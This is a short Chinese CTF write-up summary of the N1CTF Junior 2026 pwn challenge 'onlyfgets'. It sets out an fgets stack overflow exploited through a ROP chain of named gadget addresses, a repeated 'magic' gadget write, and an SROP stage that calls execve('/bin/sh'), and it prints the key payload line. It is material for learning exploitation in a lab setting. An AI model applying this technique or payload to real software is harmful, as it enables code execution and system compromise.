---
title: N1CTF Junior 2026/1-2 pwn
contest: N1CTF Junior
year: 2026
difficulty: medium
vuln_type:
- rop
- srop
tags:
- fgets 栈溢出
- 0x20 buffer + 0x1f4 read
- ROPgadget
- pop rdi; ret
- xor rbx; ret
- add rbx rdx; ret
- magic gadget
- SigreturnFrame
- pwntools
attack_chain:
- 逆向 main()：char s[32]; fgets(s, 500, stdin) — 经典栈溢出
- ROPgadget --binary onlyfgets --only "pop|ret" 找 pop_rdi=0x4011fc, pop_rbp=0x40114d
- 找更多 gadget：xor_rbx_ret=0x4011FE, add_rbx_rdx_ret=0x4010ae, magic=0x40114c, srop=0x4011C3
- 利用思路：栈溢出 → add_rbx_rdx_ret 6 次累积修改 rbx → pop_rbp 调到 0x404018+0x3d（接近 magic 写入地址）→ magic gadget 15 次写入 → 回到 main
- 第二阶段：构造 SROP 链，SigreturnFrame 设 rsp/rip/registers 调 syscall execve("/bin/sh", NULL, NULL)
- payload = b'a'*0x28 + ROP + SROP 链
- pwntools io.sendline + io.interactive() 拿 shell
key_payload: "payload = b'a'*0x28 + p64(add_rbx_rdx_ret)*6 + p64(pop_rbp) + p64(0x404018+0x3d) + p64(magic)*15"
one_liner: fgets 栈溢出 + add_rbx_rdx 累加写入 magic + SigreturnFrame 调 syscall
lesson: "magic" gadget 写入需要 add_rbx_rdx_ret 累加；SROP 适合 NX 开启且 libc 未知场景
quality: high
---

# N1CTF Junior 2026/1-2 pwn

**fgets 栈溢出 + add_rbx_rdx 累加 + SROP**

> N1CTF Junior · 2026 · medium · rop/srop · quality=high
> 思路: fgets 栈溢出 → 多次 add_rbx_rdx_ret 累加 rbx → pop_rbp 调到 magic 写入地址 → 连续 magic gadget 写入 → 二次溢出做 SROP → SigreturnFrame 调 execve("/bin/sh")
> 套路: "magic" gadget 写入需要 add_rbx_rdx_ret 累加；SROP 适合 NX 开启且 libc 未知场景

**关键 payload**:
```python
payload = b'a'*0x28 + p64(add_rbx_rdx_ret)*6 + p64(pop_rbp) + p64(0x404018+0x3d) + p64(magic)*15
```
